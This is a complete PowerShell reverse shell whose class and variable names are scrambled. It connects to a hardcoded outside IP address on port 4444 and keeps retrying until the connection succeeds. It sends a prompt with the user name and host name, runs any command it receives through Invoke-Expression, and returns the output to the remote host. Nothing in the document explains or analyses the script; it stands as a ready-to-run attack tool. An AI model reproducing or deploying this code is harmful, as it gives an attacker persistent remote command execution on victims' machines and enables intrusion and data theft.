class nzCjEpjHsHFyQYkHhfUq {
    
    [string]$ZpguQ = "93.49.240.195"
    [int]$mkyvpY = 4444

    $rbukLCK
    $PykPDVBSFUHYiMIdPkvv
    $GBbUBzQFfFnkMXZdtJH
    $OngroIxtHLuYUvMFQUkuHY
    $RfnGI
    $dAJGoWlL
    [int]$dBFWeisCiIYUMEH = 50*1024

    PqLHGNGMzis() {
        $this.PykPDVBSFUHYiMIdPkvv = $false
        while ($true) {
            try {
                $this.PykPDVBSFUHYiMIdPkvv = New-Object Net.Sockets.TcpClient($this.ZpguQ, $this.mkyvpY)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.olopgxUNZQYdxNeP()
    }

    olopgxUNZQYdxNeP() {
        $this.rbukLCK = $this.PykPDVBSFUHYiMIdPkvv.GetStream()
        $this.OngroIxtHLuYUvMFQUkuHY = New-Object Byte[] $this.dBFWeisCiIYUMEH
        $this.dAJGoWlL = New-Object Text.UTF8Encoding
        $this.GBbUBzQFfFnkMXZdtJH = New-Object IO.StreamWriter($this.rbukLCK, [Text.Encoding]::UTF8, $this.dBFWeisCiIYUMEH)
        $this.RfnGI = New-Object System.IO.StreamReader($this.rbukLCK)
        $this.GBbUBzQFfFnkMXZdtJH.AutoFlush = $true
    }

    vPNqYvjYk() {
        $this.PqLHGNGMzis()
        $this.jmqWeKtcwkQKmRizxGkCVD()
    }

    eeyioWfPhnd($hADKfRjR) {
        try {
            [byte[]]$HYImzGVsF = [text.Encoding]::Ascii.GetBytes($hADKfRjR)
            $this.GBbUBzQFfFnkMXZdtJH.Write($HYImzGVsF, 0, $HYImzGVsF.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.vPNqYvjYk()
        }
    }

    [string] CeDKoouUtcOjuPCTJjBpSO() {
        try {
            $tLKVyAyhymCqtaJhmptQMJ = $this.rbukLCK.Read($this.OngroIxtHLuYUvMFQUkuHY, 0, $this.dBFWeisCiIYUMEH)    
            $VfaxUkmYxkC = ($this.dAJGoWlL.GetString($this.OngroIxtHLuYUvMFQUkuHY, 0, $tLKVyAyhymCqtaJhmptQMJ))
            return $VfaxUkmYxkC
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.vPNqYvjYk()
            return ""
        }
    }

    [string] TtnGvgfmcWVCyzuSFAOAwF($wusyJxyfPxowwtXHGCp) {
        Write-Host $wusyJxyfPxowwtXHGCp
        try { 
            $LTDHvv = Invoke-Expression $wusyJxyfPxowwtXHGCp | Out-String
        }
        catch {
            $nWToXKARQDrGuGtTcHKd = $_.Exception
            $xSISGXIGNcthDUx = $_.Message
            $LTDHvv = "`n$_`n"
        }
        return $LTDHvv
    }

    [string] iDCrrcSlvwodrWs() {
        $QcWAKkjNgFmr = [Environment]::UserName
        $lYMkkkyBBIOZUCbfx = [System.Net.Dns]::GetHostName()
        $yNLrDAAnA = Get-Location
        return "$QcWAKkjNgFmr@$lYMkkkyBBIOZUCbfx [$yNLrDAAnA]~$ "
    }

    jmqWeKtcwkQKmRizxGkCVD() {
        while ($this.PykPDVBSFUHYiMIdPkvv.Connected) {
            $this.eeyioWfPhnd($this.iDCrrcSlvwodrWs())         
            $VfaxUkmYxkC = $this.CeDKoouUtcOjuPCTJjBpSO()
            $LTDHvv = "`n"
            if ([string]::IsNullOrEmpty($VfaxUkmYxkC)) {
                continue
            }
            $LTDHvv = $this.TtnGvgfmcWVCyzuSFAOAwF($VfaxUkmYxkC)
            $this.eeyioWfPhnd($LTDHvv + "`n")
            $this.rbukLCK.Flush()
        }
        $this.PykPDVBSFUHYiMIdPkvv.Close()
        $this.vPNqYvjYk()
    } 
}

$irlJLuuuFGEX = [nzCjEpjHsHFyQYkHhfUq]::new()
$irlJLuuuFGEX.vPNqYvjYk()
